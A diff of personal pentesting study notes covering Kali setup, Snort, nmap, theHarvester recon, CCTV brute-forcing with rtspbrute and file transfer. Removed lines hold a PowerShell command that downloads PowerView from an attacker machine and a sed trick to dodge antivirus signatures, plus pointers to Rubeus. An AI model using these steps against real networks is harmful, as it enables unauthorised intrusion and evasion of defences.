@@ -1,15 +1,5 @@
 # I am the 👁️  in the sky 🔓
 
- <br/>
-
-## ---CONCEPTS---
-
-__NAT:__ _Network Address Translation_ <br/>
-
-
-
-
-
 ## ---VIRTUALIZATION---
 
 You can get Virtualbox or __VMWare Workstation Player__ for free. <br/>
@@ -21,92 +11,6 @@ You can get Virtualbox or __VMWare Workstation Player__ for free. <br/>
 * Choose Open Project and then select the folder Kali
 
 >user: kali, password: kali
-
-
----
-
----
-
-## NETWORKING
-
-In IOS we have a hierarchical model: <br/>
-
-As user: __Router>__, As privileged user: __>Router#__ and As global config mode: __>Router(config)#__ <br/>
-
-<br/>
-
-_Exercise #1_ <br/>
-
-Add a router _1941_ and a PC connected by _rs232 + console_. <br/>
-Go __PC__ and _Desktop_ tab - __Terminal__ - Default configuration. (9600/8/None/1/None)<br/>
-...or just double click on router. <br/>
-
-* Initial configuration: __No__ <br/>
-
-To switch to privileged user: <br/>
-
->Router>enable
-
-To switch from privileged user to global configuration: <br/>
-
->Router#configure terminal
-
-__change name of device__ <br/>
-
->hostname R2D2
-
-__message of the day__ <br/>
-
->banner motd #RESTRICTED ACCESS# 
-
-Exit from a level: <br/>
-
->exit
-
-__set a password to privileged user__ <br/>
-
->enable secret cisco
-
-Where cisco is our password <br/>
-
-__set password to console access__ <br/>
-
->line console 0
->password class
->login
-
-Where class is our password and login is to force to ask for password <br/>
-
-__set password to remote console access__ <br/>
-
->line vt 0 4
->password cisco
->login
-
-__check our configuration from privileged user__ <br/>
-
->show running-config
-
-__encrypt all passwords from config user__ <br/>
-
->service password-encryption
-
-__config IP on interface from config__ <br/>
-
->interface gigabitEthernet 0/0
->ip address 192.168.10.1 255.255.255.0
->no shutdown
-
-* Config PC with IP Address 192.168.10.2 
-  from Desktop - IP Configuration and gateway 192.168.10.1
-* Connect with a cross-over cable
-* Check from CMD
-
----
-
----
-
-
 
 #      👁️👁️  
 
@@ -156,12 +60,11 @@ _mx_ is for __mail exchange__ <br/>
 
 ### SNORT By Cisco
 
-__IDS__ Intrusion Detection System <br/>
-__IPS__ Intrusion Prevention System <br/>
+Normally installed in Kali, but you can: <br/>
 
 >sudo apt-get update
+>apt-get install snort
 
->sudo apt-get install snort
 
 * In Windows, install __npcap__ 
 * Edit __snort.conf__
@@ -184,18 +87,25 @@ __exec__ <br/>
 
 >.\snort.exe -i 5 -A console -c C:\Snort\etc\snort.conf
 
+--
 
+>Hunter
 
+Run: <br/>
 
+```terminal
+theHarvester -d domain.com -b all
+```
 
-
----
+We have the option to load the webpage: __hunter.io__ <br/>
 
 ---
 
 #      👁️👁️  
 
-## ---NMAP---
+## ---EXPLORATION---
+
+### ---NMAP---
 
 _check active hosts without ports_ <br/>
 
@@ -239,175 +149,22 @@ _Decoy_ <br/>
 
 ---
 
----
 
 #      👁️👁️  
 
-## WHIRESHARK
+## ---GAINING ACCESS---
 
 
-__TCP/IP__ <br/>
-
-Sends data in little packages <br/>
-
-It has 4 layers:
-
-* Network Access (Ethernet)
-* Internet (IPv4)
-* Transport (UDP, TCP)
-* Application (DNS, TLS)
-
-_router_ <br/>
-
-Divides Broadcast Domains <br/>
-
-_switch_ <br/>
-
-Divides Collision Domains <br/>
-
-_npcap_ driver for link layer for Windows <br/>
-
-_Libpcap_ driver for link layer for Linux <br/>
-
----
-
-_Dumpcap_ Capture Engine <br/>
-
-
-__SECTIONS__ <br/>
-
-We have 3 basic panels:
-
-_package list panel_ <br/>
-
-Every little package in a row. <br/>
-
-_details panel_ <br/>
-
-It has two sections: <br/>
-<br/>
-
-* Metadata from Wireshark
-* TCP/IP Headers
-
-
-_bytes panel_ <br/>
-
-Info in hexadecimal and ASCII <br/>
-
-<br/>
-
----
-
----
 
 #      👁️👁️  
 
-## Active Directory
+## ---MAINTAINING ACCESS---
 
-Stores information of resources of a network. <br/>
-
-### Basic Elements
-
-* Forests - The Highest level. Can contain one or more domains.
-* Domains - Can contain one or more OU
-* Organizational Units - Let apply Group Policies and group permissions
-
-__EVERYTHING IS AN OBJECT!__ <br/>
-
-### SAM - Security Account Manager
-
-Stores information about users, groups and passwords. <br/>
-
-The SAM DB is checked by the __LSA__ Local Security Authority <br/>
-
-SAM is for cached credentials <br/>
-
-We can see them in C:\Users\jhon\Desktop\logonSessions\logonsessions.exe <br/>
-
-NTDS (NT Directory Server)
-
-### LDAP - Lightweight Directory Access Protocol
-
-Is an Application Protocol that lets interact with Directory Services to store, read or modify information. <br/>
-
-__copy from kali linux to windows__ <br/>
-
->python2 -m SimpleHTTPServer
-
-* The file has to be in our directory where runs the FTP.
-
-* Now run from powershell:
-
->(New-Object System.NET.WebClient).DownloadFile("http://192.168.20.129:8000/PowerView.ps1", "powerview.ps1")
-
-__run PowerView__ <br/>
-
-AV's by default has a Hash signature, we have to edit the file to skip them: <br/>
-
-* From Kali Linux:
-
->sed '/<#/,/#>/d' powerview.ps1 > new_powerview.ps1
-
-* From Powershell:
-
->. .\new_powerview.ps1
-
-### ACL - Access Control List
-
-Lists to manage and control access permitions
-
-
-### KERBEROS
-
-Authentication Protocol for Active Directory. <br/>
-
-We can use wireshark to scan Kerberos (KRB5) where we can find: <br/>
-
-* AS-REQ (Authentication Service Request) - Sends cname and sname
-* KRB Error: KRB5KDC_ERR_PREAUTH_REQUIRED
-  * User exists! - DC Requires a cipher Timestamp, otherwise: PRINCIPAL_UNKNOWN
-* AS-REP (Authentication Service Reply)
-* TGS (Ticket Granted Service)
-
->We can use kerbrut
-
->We can use Rubeus
-
-https://github.com/GhostPack/Rubeus <br/>
-
-* Go to __Compile Instructions__
-* __Install__ .Net Development Desktop from Visual Studio in the given link.
-* Open project (Choose _Rubeus.sln_)
-* Select Rubeus folder and go to __Compile__
-
-
-
-
-
-
-
-
-
-
-
----
-
----
 
 #      👁️👁️  
 
-## Kali Linux
+## ---COVERING TRACKS---
 
->Hunter
-
-Run: <br/>
-
-```terminal
-theHarvester -d domain.com -b all
-```
-
-We have the option to load the webpage: __hunter.io__ <br/>
 
 
 ## CCTV
@@ -428,10 +185,6 @@ Install python installer: <br>
 >python3 setup.py install
 >rtspbrute -t target.txt
 
-
----
-
----
 
 ## FILE TRANSFERING
 
@@ -497,17 +250,7 @@ twistd3 -n ftp -r .
 ftp
 open 192.168.20.137 2121
 ```
-
-
-
-
-
-
-
-
 #      👁️👁️  
-
-## WEB
 
 >we can use netcat
 
@@ -559,16 +302,8 @@ open 192.168.20.137 2121
 
 >check meshcentral
 
+__IDS__ Intrusion Detection System <br/>
+__IPS__ Intrusion Prevention System <br/>
 
-#      👁️👁️  
 
-## ELECTRONICS
-
-### Current
-
-The meaning of current in electronics is close to that of the current in a river. <br/><br/>
-
-Is the amount of charge carried by electrons passing a point in a wire per second. <br/><br/>
-
-The unit of current is the __Ampere__ abbreviate as _amp_<br/><br/>
 
